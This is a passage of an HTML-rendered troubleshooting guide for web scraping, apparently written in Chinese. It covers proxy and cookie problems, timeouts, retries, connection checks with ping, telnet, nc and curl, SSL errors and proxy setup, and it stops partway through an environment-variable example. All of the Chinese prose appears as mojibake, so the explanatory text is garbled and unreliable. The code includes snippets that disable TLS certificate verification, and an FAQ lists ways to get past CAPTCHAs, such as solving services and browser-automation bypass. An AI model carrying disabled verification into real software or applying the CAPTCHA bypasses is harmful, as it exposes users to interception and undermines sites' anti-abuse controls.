      <h3 id="q-ä¸ºä»€ä¹ˆæˆ‘çš„ä»£ç†ä¸ç”Ÿæ•ˆ">Q: ä¸ºä»€ä¹ˆæˆ‘çš„ä»£ç†ä¸ç”Ÿæ•ˆï¼Ÿ</h3>

      <p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹:</p>

      <ol>
        <li>ä»£ç†é…ç½®æ ¼å¼æ˜¯å¦æ­£ç¡®</li>
        <li>ä»£ç†æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ</li>
        <li>ç³»ç»Ÿä»£ç†è®¾ç½®æ˜¯å¦æ­£ç¡®</li>
        <li>æ˜¯å¦éœ€è¦è®¾ç½®ç¯å¢ƒå˜é‡</li>
      </ol>

      <p>è¯¦è§: <a href="#10-Troubleshooting-network-issues-ä»£ç†é…ç½®é—®é¢˜">ä»£ç†é…ç½®é—®é¢˜</a></p>

      <h3 id="q-å¦‚ä½•å¤„ç†éªŒè¯ç ">Q: å¦‚ä½•å¤„ç†éªŒè¯ç ï¼Ÿ</h3>

      <p><strong>A</strong>: å¸¸è§æ–¹æ³•:</p>

      <ol>
        <li>ä½¿ç”¨éªŒè¯ç è¯†åˆ«æœåŠ¡ (2Captcha, æ‰“ç å¹³å°)</li>
        <li>è‡ªå»º OCR è¯†åˆ«</li>
        <li>ä½¿ç”¨æµè§ˆå™¨è‡ªåŠ¨åŒ–ç»•è¿‡</li>
        <li>åˆ†æéªŒè¯ç ç”Ÿæˆé€»è¾‘</li>
      </ol>

      <p>è¯¦è§: <a href="#10-Troubleshooting-anti-scraping-issues-éªŒè¯ç æ‹¦æˆª">éªŒè¯ç å¤„ç†</a></p>

      <h3 id="q-ä¸ºä»€ä¹ˆ-cookie-ä¼ è¿‡å»è¿˜æ˜¯å¤±è´¥">Q: ä¸ºä»€ä¹ˆ Cookie ä¼ è¿‡å»è¿˜æ˜¯å¤±è´¥ï¼Ÿ</h3>

      <p><strong>A</strong>: å¯èƒ½åŸå› :</p>

      <ol>
        <li>Cookie å·²è¿‡æœŸ</li>
        <li>ç¼ºå°‘å¿…è¦çš„ Cookie å­—æ®µ</li>
        <li>Cookie åŸŸåæˆ–è·¯å¾„ä¸åŒ¹é…</li>
        <li>éœ€è¦å…¶ä»–è¯·æ±‚å¤´é…åˆ</li>
      </ol>

      <p>è¯¦è§: <a href="#10-Troubleshooting-network-issues-cookie-å¤±æ•ˆ">Cookie é—®é¢˜</a></p>

      <h3 id="q-javascript-æ··æ·†ä»£ç æ€ä¹ˆè°ƒè¯•">Q: JavaScript æ··æ·†ä»£ç æ€ä¹ˆè°ƒè¯•ï¼Ÿ</h3>

      <p><strong>A</strong>: æŠ€å·§:</p>

      <ol>
        <li>ä½¿ç”¨ Source Map (å¦‚æœæœ‰)</li>
        <li>æ ¼å¼åŒ–ä»£ç  (Beautify)</li>
        <li>ä½¿ç”¨ AST å·¥å…·è¿˜åŸ</li>
        <li>å•æ­¥è°ƒè¯•è¿½è¸ª</li>
      </ol>

      <p>è¯¦è§: <a href="#10-Troubleshooting-javascript-debugging">JavaScript è°ƒè¯•</a></p>

      <hr />

      <h2 id="é¢„é˜²æªæ–½">ğŸ’¡ é¢„é˜²æªæ–½</h2>

      <h3 id="ä»£ç è´¨é‡">ä»£ç è´¨é‡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å¼‚å¸¸å¤„ç†</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
<span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Request timeout: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">HTTPError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;HTTP error: </span><span class="si">{</span><span class="n">e</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Unexpected error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># 2. å‚æ•°éªŒè¯</span>
<span class="k">def</span><span class="w"> </span><span class="nf">process_data</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Data cannot be empty&quot;</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
        <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span><span class="s2">&quot;Data must be a dictionary&quot;</span><span class="p">)</span>
    <span class="c1"># å¤„ç†æ•°æ®...</span>

<span class="c1"># 3. èµ„æºç®¡ç†</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="c1"># æ–‡ä»¶è‡ªåŠ¨å…³é—­</span>
</code></pre>
      </div>

      <h3 id="æ—¥å¿—è®°å½•">æ—¥å¿—è®°å½•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®°å½•å…³é”®æ“ä½œ</span>
<span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Processing URL: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># è®°å½•é”™è¯¯è¯¦æƒ…</span>
<span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Failed to parse: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">exc_info</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># è®°å½•æ€§èƒ½æŒ‡æ ‡</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
<span class="c1"># ... æ“ä½œ</span>
<span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Operation took </span><span class="si">{</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ç›‘æ§å‘Šè­¦">ç›‘æ§å‘Šè­¦</h3>

      <ul>
        <li>è®¾ç½®è¯·æ±‚æˆåŠŸç‡ç›‘æ§</li>
        <li>é…ç½®é”™è¯¯æ—¥å¿—å‘Šè­¦</li>
        <li>ç›‘æ§èµ„æºä½¿ç”¨æƒ…å†µ</li>
        <li>å®šæœŸæ£€æŸ¥æ•°æ®è´¨é‡</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ”— ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#02-Tooling-browser-devtools">Chrome DevTools æŒ‡å—</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a></li>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
        <li><a href="#11-Resources-faq">FAQ</a></li>
      </ul>

      <hr />

      <h2 id="è·å–å¸®åŠ©">ğŸ†˜ è·å–å¸®åŠ©</h2>

      <p>å¦‚æœä»¥ä¸Šå†…å®¹æ— æ³•è§£å†³æ‚¨çš„é—®é¢˜:</p>

      <ol>
        <li>æŸ¥çœ‹ <a href="https://github.com/your-repo/issues">GitHub Issues</a></li>
        <li>æäº¤æ–°çš„ Issue (é™„å¸¦è¯¦ç»†é”™è¯¯æ—¥å¿—)</li>
        <li>åŠ å…¥ç¤¾åŒºè®¨è®º</li>
        <li>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£</li>
      </ol>

      <hr />

      <p>è®°ä½ï¼š<strong>è°ƒè¯•æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œè€å¿ƒæ˜¯å…³é”®ï¼</strong> ğŸ¯</p>

    </div>

    <div class="section" id="10-Troubleshooting-network-issues">
      <h2>75. Network Issues</h2>
      <h1 id="ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜">ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜</h1>

      <p>å¸¸è§çš„ç½‘ç»œè¿æ¥å’Œ HTTP è¯·æ±‚é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="è¯·æ±‚è¶…æ—¶">è¯·æ±‚è¶…æ—¶</h2>

      <h3 id="é—®é¢˜è¡¨ç°">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span> <span class="n">HTTPConnectionPool</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">):</span>
<span class="n">Read</span> <span class="n">timed</span> <span class="n">out</span><span class="o">.</span> <span class="p">(</span><span class="n">read</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="åŸå› åˆ†æ">åŸå› åˆ†æ</h3>

      <ol>
        <li>ç½‘ç»œå»¶è¿Ÿè¿‡é«˜</li>
        <li>æœåŠ¡å™¨å“åº”æ…¢</li>
        <li>è¶…æ—¶è®¾ç½®è¿‡çŸ­</li>
        <li>ä»£ç†è¿æ¥é—®é¢˜</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-å¢åŠ è¶…æ—¶æ—¶é—´">1. å¢åŠ è¶…æ—¶æ—¶é—´</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># è®¾ç½®æ›´é•¿çš„è¶…æ—¶æ—¶é—´ (è¿æ¥è¶…æ—¶, è¯»å–è¶…æ—¶)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">30</span><span class="p">))</span>

<span class="c1"># æˆ–è€…åªè®¾ç½®æ€»è¶…æ—¶</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-é…ç½®é‡è¯•æœºåˆ¶">2. é…ç½®é‡è¯•æœºåˆ¶</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">requests.adapters</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPAdapter</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib3.util.retry</span><span class="w"> </span><span class="kn">import</span> <span class="n">Retry</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># é…ç½®é‡è¯•ç­–ç•¥</span>
<span class="n">retry_strategy</span> <span class="o">=</span> <span class="n">Retry</span><span class="p">(</span>
    <span class="n">total</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span>                    <span class="c1"># æ€»é‡è¯•æ¬¡æ•°</span>
    <span class="n">backoff_factor</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>          <span class="c1"># é‡è¯•é—´éš”å€æ•°</span>
    <span class="n">status_forcelist</span><span class="o">=</span><span class="p">[</span><span class="mi">429</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="mi">502</span><span class="p">,</span> <span class="mi">503</span><span class="p">,</span> <span class="mi">504</span><span class="p">],</span>
    <span class="n">allowed_methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HEAD&quot;</span><span class="p">,</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;OPTIONS&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">]</span>
<span class="p">)</span>

<span class="n">adapter</span> <span class="o">=</span> <span class="n">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retry_strategy</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>

<span class="c1"># å‘é€è¯·æ±‚</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨å¼‚æ­¥è¯·æ±‚">3. ä½¿ç”¨å¼‚æ­¥è¯·æ±‚</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">aiohttp</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">fetch</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
            <span class="k">return</span> <span class="k">await</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">TimeoutError</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Timeout: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="n">fetch</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span> <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">]</span>
        <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">results</span>

<span class="n">results</span> <span class="o">=</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¿æ¥è¢«æ‹’ç»">è¿æ¥è¢«æ‹’ç»</h2>

      <h3 id="é—®é¢˜è¡¨ç°-2">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">:</span> <span class="n">HTTPConnectionPool</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">):</span>
<span class="n">Max</span> <span class="n">retries</span> <span class="n">exceeded</span> <span class="k">with</span> <span class="n">url</span><span class="p">:</span> <span class="o">/</span> <span class="p">(</span><span class="n">Caused</span> <span class="n">by</span> <span class="n">NewConnectionError</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="åŸå› åˆ†æ-2">åŸå› åˆ†æ</h3>

      <ol>
        <li>ç›®æ ‡æœåŠ¡å™¨ä¸å¯ç”¨</li>
        <li>ç½‘ç»œä¸é€š</li>
        <li>ç«¯å£é”™è¯¯</li>
        <li>é˜²ç«å¢™æ‹¦æˆª</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ-2">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æ£€æŸ¥ç½‘ç»œè¿é€šæ€§">1. æ£€æŸ¥ç½‘ç»œè¿é€šæ€§</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æµ‹è¯•è¿æ¥</span>
ping<span class="w"> </span>example.com

<span class="c1"># æµ‹è¯•ç«¯å£</span>
telnet<span class="w"> </span>example.com<span class="w"> </span><span class="m">80</span>
<span class="c1"># æˆ–ä½¿ç”¨ nc</span>
nc<span class="w"> </span>-zv<span class="w"> </span>example.com<span class="w"> </span><span class="m">80</span>

<span class="c1"># ä½¿ç”¨ curl æµ‹è¯•</span>
curl<span class="w"> </span>-I<span class="w"> </span>https://example.com
</code></pre>
      </div>

      <h4 id="2-æ£€æŸ¥-url-æ ¼å¼">2. æ£€æŸ¥ URL æ ¼å¼</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://example.com:443/path&quot;</span>
<span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Scheme: </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>    <span class="c1"># https</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Host: </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">netloc</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>      <span class="c1"># example.com:443</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Port: </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>        <span class="c1"># 443</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Path: </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>        <span class="c1"># /path</span>

<span class="c1"># ç¡®ä¿ URL æ ¼å¼æ­£ç¡®</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="s1">&#39;https://&#39;</span><span class="p">)):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://&#39;</span> <span class="o">+</span> <span class="n">url</span>
</code></pre>
      </div>

      <h4 id="3-é…ç½®ä»£ç†">3. é…ç½®ä»£ç†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy.com:8080&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ssl-è¯ä¹¦é”™è¯¯">SSL è¯ä¹¦é”™è¯¯</h2>

      <h3 id="é—®é¢˜è¡¨ç°-3">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SSLError</span><span class="p">:</span> <span class="n">HTTPSConnectionPool</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">443</span><span class="p">):</span>
<span class="n">SSL</span> <span class="n">certificate</span> <span class="n">verify</span> <span class="n">failed</span>
</code></pre>
      </div>

      <h3 id="åŸå› åˆ†æ-3">åŸå› åˆ†æ</h3>

      <ol>
        <li>æœåŠ¡å™¨è¯ä¹¦è¿‡æœŸ</li>
        <li>è¯ä¹¦ä¸è¢«ä¿¡ä»»</li>
        <li>è‡ªç­¾åè¯ä¹¦</li>
        <li>è¯ä¹¦é“¾ä¸å®Œæ•´</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ-3">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ç¦ç”¨-ssl-éªŒè¯-ä»…ç”¨äºæµ‹è¯•">1. ç¦ç”¨ SSL éªŒè¯ (ä»…ç”¨äºæµ‹è¯•)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>

<span class="c1"># ç¦ç”¨ SSL è­¦å‘Š</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="c1"># ç¦ç”¨éªŒè¯</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-æŒ‡å®š-ca-è¯ä¹¦">2. æŒ‡å®š CA è¯ä¹¦</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ç³»ç»Ÿè¯ä¹¦</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">certifi</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="n">certifi</span><span class="o">.</span><span class="n">where</span><span class="p">())</span>

<span class="c1"># æˆ–æŒ‡å®šè‡ªå®šä¹‰è¯ä¹¦</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="s1">&#39;/path/to/ca-bundle.crt&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨è‡ªå®šä¹‰-ssl-ä¸Šä¸‹æ–‡">3. ä½¿ç”¨è‡ªå®šä¹‰ SSL ä¸Šä¸‹æ–‡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>

<span class="c1"># åˆ›å»º SSL ä¸Šä¸‹æ–‡</span>
<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
<span class="n">context</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">context</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>

<span class="c1"># ä½¿ç”¨ urllib3</span>
<span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="o">.</span><span class="n">PoolManager</span><span class="p">(</span>
    <span class="n">ssl_context</span><span class="o">=</span><span class="n">context</span><span class="p">,</span>
    <span class="n">cert_reqs</span><span class="o">=</span><span class="s1">&#39;CERT_NONE&#39;</span>
<span class="p">)</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ä»£ç†é…ç½®é—®é¢˜">ä»£ç†é…ç½®é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-4">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>è¯·æ±‚æ— æ³•é€šè¿‡ä»£ç†</li>
        <li>ä»£ç†è®¤è¯å¤±è´¥</li>
        <li>HTTPS ä»£ç†ä¸ç”Ÿæ•ˆ</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-4">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-http-ä»£ç†">1. HTTP ä»£ç†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åŸºç¡€ä»£ç†</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy.com:8080&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-socks-ä»£ç†">2. SOCKS ä»£ç†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># éœ€è¦å®‰è£…: pip install requests[socks]</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5://127.0.0.1:1080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5://127.0.0.1:1080&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä»£ç†è®¤è¯">3. ä»£ç†è®¤è¯</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¸¦ç”¨æˆ·åå¯†ç çš„ä»£ç†</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://username:password@proxy.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;http://username:password@proxy.com:8080&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="4-ç¯å¢ƒå˜é‡é…ç½®">4. ç¯å¢ƒå˜é‡é…ç½®</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Linux/Mac</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">HTTP_PROXY</span><span class="o">=</span><span class="s2">&quot;http://proxy.com:8080&quot;</span>
